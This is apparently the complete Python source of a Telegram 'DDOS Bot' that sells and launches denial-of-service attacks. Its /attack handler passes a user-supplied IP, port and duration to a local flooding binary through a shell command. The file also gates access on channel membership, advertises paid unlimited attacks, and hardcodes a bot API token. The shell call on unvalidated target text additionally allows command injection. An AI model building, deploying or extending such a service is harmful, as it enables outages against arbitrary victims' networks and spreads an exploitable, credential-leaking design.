#!/usr/bin/python3
import telebot
import datetime
import time
import subprocess
import threading
import logging
import os
import signal

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Bot configuration
BOT_USERNAME = "@PUBLIC_DDOSBOT"
bot = telebot.TeleBot('7985414018:AAEFOyaJKpf9eHebgOO_7BG8P0XLr0jA28c')
ADMIN_IDS = {"1866961136", "1807014348"}
CHANNEL_USERNAME = "@DDOS_SERVER69"
FEEDBACK_CHANNEL = "@DDOS_SERVER_FEEDBACK"
PAID_CHANNEL = "@DDOS_SERVER69"
CONTACT_ADMINS = ["@Rohan2349", "@Sadiq9869"]

# Constants
MAX_DURATION = 180

# Data storage
USER_FILE = "users.txt"
FEEDBACK_FILE = "feedback_photos.txt"
FEEDBACK_LOG_FILE = "feedback_log.txt"

# Global variables
user_data = {}
group_attacks = {}
active_attacks = {}
feedback_photo_ids = set()

def load_users():
    try:
        with open(USER_FILE, "r") as file:
            for line in file:
                user_id, _, last_reset = line.strip().split(',')
                user_data[user_id] = {
                    'last_reset': datetime.datetime.fromisoformat(last_reset)
                }
    except FileNotFoundError:
        pass

def save_users():
    with open(USER_FILE, "w") as file:
        for user_id, data in user_data.items():
            file.write(f"{user_id},0,{data['last_reset'].isoformat()}\n")

def load_feedback_photos():
    try:
        with open(FEEDBACK_FILE, "r") as file:
            for line in file:
                feedback_photo_ids.add(line.strip())
    except FileNotFoundError:
        pass

def save_feedback_photo(photo_id, user_id):
    timestamp = datetime.datetime.now().isoformat()
    with open(FEEDBACK_FILE, "a") as file:
        file.write(f"{photo_id}\n")
    with open(FEEDBACK_LOG_FILE, "a") as log_file:
        log_file.write(f"{timestamp},{user_id},{photo_id}\n")
    feedback_photo_ids.add(photo_id)

def is_user_in_both_channels(user_id):
    try:
        main_channel = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        feedback_channel = bot.get_chat_member(FEEDBACK_CHANNEL, user_id)
        return (main_channel.status in ['member', 'administrator', 'creator'] and 
                feedback_channel.status in ['member', 'administrator', 'creator'])
    except Exception as e:
        logger.error(f"Error checking channel membership for {user_id}: {e}")
        return False

# Helper function to check if command is allowed in private chat
def check_private_chat(message, user_id):
    if message.chat.type == 'private' and user_id not in ADMIN_IDS:
        bot.reply_to(message, "🚫 Regular users can only use this bot in groups!")
        return False
    return True

@bot.message_handler(commands=['contact'])
def handle_contact(message):
    user_id = str(message.from_user.id)
    if not check_private_chat(message, user_id):
        return
    contact_text = f"""
📞 **Need Help or Want Premium Access?**  
🔥 Contact our admins:  
👤 {CONTACT_ADMINS[0]}  
👤 {CONTACT_ADMINS[1]}  
💎 DM to buy paid bot access for unlimited attacks!  
🌟 Join {PAID_CHANNEL} for premium features!
"""
    bot.reply_to(message, contact_text)

@bot.message_handler(commands=['help'])
def handle_help(message):
    user_id = str(message.from_user.id)
    if not check_private_chat(message, user_id):
        return
    help_text = """
🌟 **DDOS Bot Commands** 🌟
/attack <IP> <PORT> <TIME> - Start an attack
/contact - Get help or buy premium
📸 Share a screenshot after attack to support the community!
🔥 Join @DDOS_SERVER69 & @DDOS_SERVER_FEEDBACK to use!
💎 Buy unlimited attacks from @Rohan2349/@Sadiq9869
"""
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name
    group_id = str(message.chat.id)
    is_admin = user_id in ADMIN_IDS
    command = message.text.split()

    if not check_private_chat(message, user_id):
        return

    if message.chat.type not in ['group', 'supergroup'] and not is_admin:
        bot.reply_to(message, "🚫 Use in groups only!")
        return

    if not is_user_in_both_channels(user_id):
        bot.reply_to(message, f"❗ Join both channels first!\n🔗 {CHANNEL_USERNAME}\n🔗 {FEEDBACK_CHANNEL}")
        return

    group_attacks.setdefault(group_id, False)
    if group_attacks[group_id]:
        bot.reply_to(message, "⚠️ Attack in progress in this group!")
        return
    
    group_attacks[group_id] = True

    if len(command) != 4:
        bot.reply_to(message, "⚠️ Usage: /attack <IP> <PORT> <TIME>")
        group_attacks[group_id] = False
        return

    target, port, time_duration = command[1], command[2], command[3]
    try:
        port = int(port)
        time_duration = int(time_duration)
        if not is_admin and time_duration > MAX_DURATION:
            bot.reply_to(message, f"🚫 Max duration for non-admins: {MAX_DURATION}s")
            group_attacks[group_id] = False
            return
        if time_duration <= 0:
            bot.reply_to(message, "❌ Duration must be positive!")
            group_attacks[group_id] = False
            return
    except ValueError:
        bot.reply_to(message, "❌ Port and time must be integers!")
        group_attacks[group_id] = False
        return

    profile_photos = bot.get_user_profile_photos(user_id)
    profile_pic = profile_photos.photos[0][-1].file_id if profile_photos.total_count > 0 else None
    
    if not profile_pic:
        bot.reply_to(message, "❌ Set a profile picture!")
        group_attacks[group_id] = False
        return

    attack_start_msg = (
        f"👤 User: @{user_name}\n"
        f"💥 Attack Started!\n"
        f"🎯 Target: {target}:{port}\n"
        f"⏳ Duration: {time_duration}s\n"
        f"📸 Share a screenshot to support the community!"
    )
    
    sent_message = bot.send_photo(message.chat.id, profile_pic, caption=attack_start_msg)
    logger.info(f"Attack started by {user_id} in {group_id}: {target}:{port} for {time_duration}s")

    def update_countdown(msg_id, chat_id, duration):
        remaining_time = duration
        while remaining_time >= 0 and group_attacks[group_id]:
            updated_msg = (
                f"👤 User: @{user_name}\n"
                f"💥 Attack Started!\n"
                f"🎯 Target: {target}:{port}\n"
                f"⏳ Duration: {remaining_time}s\n"
                f"📸 Share a screenshot to support the community!"
            )
            try:
                bot.edit_message_caption(chat_id=chat_id, message_id=msg_id, caption=updated_msg)
            except Exception as e:
                logger.error(f"Failed to update countdown: {e}")
                break
            time.sleep(1)
            remaining_time -= 1

    countdown_thread = threading.Thread(target=update_countdown, 
                                       args=(sent_message.message_id, message.chat.id, time_duration))
    countdown_thread.start()

    full_command = f"./Rohan {target} {port} {time_duration} 512 800"
    try:
        attack_process = subprocess.Popen(full_command, shell=True, preexec_fn=os.setsid)
        active_attacks[group_id] = attack_process
        
        attack_process.wait()
        
        if group_attacks[group_id]:
            bot.send_message(message.chat.id, 
                           f"✅ Attack Complete!\n🎯 {target}:{port}\n⏳ {time_duration}s")
            logger.info(f"Attack completed in {group_id}: {target}:{port}")
    except subprocess.CalledProcessError as e:
        bot.reply_to(message, f"❌ Error: {e}")
        logger.error(f"Attack failed in {group_id}: {e}")
    finally:
        if group_id in active_attacks:
            del active_attacks[group_id]
        group_attacks[group_id] = False

@bot.message_handler(content_types=['photo'])
def handle_screenshot(message):
    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name
    
    if not check_private_chat(message, user_id):
        return
    if user_id in ADMIN_IDS:
        bot.reply_to(message, "👑 Admin feedback not required!")
        return

    if not is_user_in_both_channels(user_id):
        bot.reply_to(message, f"❌ Join both channels first!\n🔗 {CHANNEL_USERNAME}\n🔗 {FEEDBACK_CHANNEL}")
        return

    photo_file_unique_id = message.photo[-1].file_unique_id
    user_data.setdefault(user_id, {'last_reset': datetime.datetime.now()})
    
    if photo_file_unique_id in feedback_photo_ids:
        bot.reply_to(message, 
                     f"⚠️ **WARNING: Duplicate Screenshot Detected!**\n"
                     f"📸 This photo was submitted before.\n"
                     f"ℹ️ Please submit a new screenshot next time!")
        return

    save_feedback_photo(photo_file_unique_id, user_id)
    
    bot.forward_message(FEEDBACK_CHANNEL, message.chat.id, message.message_id)
    bot.send_message(FEEDBACK_CHANNEL, 
                    f"📸 Feedback Received!\n👤 User: {user_name}\n🆔 ID: {user_id}\n📍 Group: {message.chat.title} ({message.chat.id})")
    
    bot.reply_to(message, 
                 f"✅ Feedback accepted!\n"
                 f"📸 Thank you for supporting the community!")

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_id = str(message.from_user.id)
    if not check_private_chat(message, user_id):
        return
    user_name = message.from_user.first_name
    response = (
        "🌌 *Welcome to the Elite DDOS Network, {}!* 🌌\n"
        "══════════════════════════════════\n"
        "🚀 *World’s Most Advanced DDOS Bot* 🚀\n"
        "Experience cutting-edge technology with unparalleled power and precision.\n"
        "Join the elite and dominate the digital frontier!\n\n"
        "🔥 *Why Choose Us?* 🔥\n"
        "✨ *Unmatched Power*: Launch attacks with surgical accuracy.\n"
        "⚡ *Real-Time Control*: Instant feedback and seamless operation.\n"
        "💎 *Premium Access*: Unlock exclusive features with our VIP plan.\n"
        "📸 *Community-Driven*: Share your victories with screenshots.\n\n"
        "🌟 *Get Started Now* 🌟\n"
        "🔗 Join our main channel: [{}](https://t.me/DDOS_SERVER69)\n"
        "🔗 Join feedback hub: [{}](https://t.me/DDOS_SERVER_FEEDBACK)\n"
        "💎 Unlock VIP features: [{}](https://t.me/DDOS_SERVER69)\n"
        "📞 Contact our elite admins:\n"
        "👤 [{}](https://t.me/Rohan2349)\n"
        "👤 [{}](https://t.me/Sadiq9869)\n\n"
        "══════════════════════════════════\n"
        "💡 *Pro Tip*: Use /help to explore commands and unleash your potential!\n"
        "🌍 *Join the Elite. Rule the Web.*"
    ).format(
        user_name,
        CHANNEL_USERNAME,
        FEEDBACK_CHANNEL,
        PAID_CHANNEL,
        CONTACT_ADMINS[0],
        CONTACT_ADMINS[1]
    )
    bot.reply_to(message, response, parse_mode='MarkdownV2')

load_users()
load_feedback_photos()

if __name__ == "__main__":
    logger.info("Bot starting...")
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=60)
        except Exception as e:
            logger.error(f"Polling error: {e}")
            time.sleep(15)